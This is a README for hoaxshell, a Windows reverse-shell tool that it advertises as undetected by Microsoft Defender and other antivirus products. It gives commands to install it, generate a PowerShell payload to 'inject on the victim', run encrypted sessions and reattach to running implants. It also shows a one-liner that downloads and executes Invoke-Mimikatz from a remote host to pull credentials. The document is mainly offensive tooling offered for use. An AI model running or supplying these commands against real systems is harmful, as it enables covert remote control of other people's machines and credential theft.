# hoaxshell

[![Python 3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/powershell-%E2%89%A5%20v3.0-blue">
[![License](https://img.shields.io/badge/license-BSD-red.svg)](https://github.com/t3l3machus/hoaxshell/blob/main/LICENSE.md)
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">
## Purpose

hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and other AV solutions as it is solely based on http(s) traffic. The tool is easy to use, it generates it's own PowerShell payload and it supports encryption (ssl).  
  
So far, it has been tested on fully updated **Windows 11 Enterprise** and **Windows 10 Pro** boxes (see video and screenshots).
  
### Video Presentation  
Coming soon.

## Screenshots
![usage_example_png](https://raw.github.com/t3l3machus/hoaxshell/master/screenshots/hoaxshell-win11.png)
  
Find more screenshots [here](screenshots/).

## Installation
```
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

## Usage
#### Basic shell session over http
```
sudo python3 hoaxshell.py -s <your_ip>
```  
When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the "rawpayload" prompt command or start the hoaxshell with the `-r` argument. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.

#### Encrypted shell session (https):
```
# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

```  
The generated PowerShell payload will be longer in length because of an additional block of code that disables the ssl certificate validation.

#### Grab session mode
In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
```
sudo python3 hoaxshell.py -s <your_ip> -g
```  
**Important**: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).

## Limitations
The shell is going to hang if you execute a command that initiates an interactive session. Example:  
```
# this command will execute succesfully and you will have no problem: 
> powershell echo 'This is a test'

# But this one will open an interactive session within the hoaxshell session and is going to cause the shell to hang:
> powershell

# In the same manner, you won't have a problem executing this:
> cmd /c dir /a

# But this will cause your hoaxshell to hang:
cmd.exe
```  

So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:
```
hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:4443/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"PRIVILEGE::Debug"'
```
Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.

## Future
I am currently working on some auxiliary-type prompt commands to automate parts of host enumeration.
